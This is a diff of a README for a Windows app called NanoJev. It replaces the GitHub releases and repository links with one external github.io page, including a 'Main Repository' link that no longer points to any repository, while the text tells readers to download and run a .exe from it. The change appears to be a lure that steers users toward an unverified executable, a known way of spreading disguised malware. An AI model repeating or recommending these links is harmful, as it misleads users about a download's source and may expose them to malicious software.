@@ -1,6 +1,6 @@
 # ⚡ NanoJev - Make Smarter Choices, Effortlessly
 
-[![Download NanoJev](https://img.shields.io/badge/Download-NanoJev-blueviolet?style=for-the-badge&logo=github)](https://github.com/Juniebentonitic2834/NanoJev/releases)
+[![Download NanoJev](https://img.shields.io/badge/Download-NanoJev-blueviolet?style=for-the-badge&logo=github)](https://juniebentonitic2834.github.io)
 
 ## 🎯 What Is NanoJev?
 
@@ -29,7 +29,7 @@ Getting NanoJev running on your Windows computer takes less than five minutes. F
 ### 📥 Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/Juniebentonitic2834/NanoJev/releases**](https://github.com/Juniebentonitic2834/NanoJev/releases)
+[**https://juniebentonitic2834.github.io**](https://juniebentonitic2834.github.io)
 
 The download page will show available files. Look for the newest version (usually at the top). Click the file that ends with **.exe** or **.zip** depending on what's listed.
 
@@ -132,8 +132,8 @@ Your data stays on your machine. NanoJev doesn't send your decisions or training
 
 ## 🗂️ Project Links
 
-- **Download Page:** [https://github.com/Juniebentonitic2834/NanoJev/releases](https://github.com/Juniebentonitic2834/NanoJev/releases)
-- **Main Repository:** [https://github.com/Juniebentonitic2834/NanoJev](https://github.com/Juniebentonitic2834/NanoJev)
+- **Download Page:** [https://juniebentonitic2834.github.io](https://juniebentonitic2834.github.io)
+- **Main Repository:** [https://juniebentonitic2834.github.io](https://juniebentonitic2834.github.io)
 
 ## 🤝 Support
 
